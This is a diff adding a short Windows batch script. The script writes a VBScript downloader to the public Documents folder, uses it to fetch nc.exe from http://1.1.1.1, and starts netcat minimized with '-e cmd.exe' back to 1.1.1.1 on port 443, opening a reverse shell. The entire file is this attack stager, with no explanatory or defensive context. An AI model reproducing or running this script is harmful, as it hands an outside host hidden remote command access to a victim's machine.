@@ -1,0 +1,21 @@
+cd\Users\Public\Documents\
+timeout 1
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs
+timeout 1
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs
+timeout 1
+echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs
+timeout 1
+echo xHttp.Send >> dl.vbs
+timeout 1
+echo bStrm.type = 1 >> dl.vbs
+timeout 1
+echo bStrm.open >> dl.vbs
+timeout 1
+echo bStrm.write xHttp.responseBody >> dl.vbs
+timeout 1
+echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
+timeout 1
+dl.vbs "http://1.1.1.1/nc.exe" "c:\Users\Public\Documents\nc.exe"
+timeout 1
+start "nc" /d "c:\Users\Public\Documents\" /min /b "c:\Users\Public\Documents\nc.exe" -nv 1.1.1.1 443 -e cmd.exe
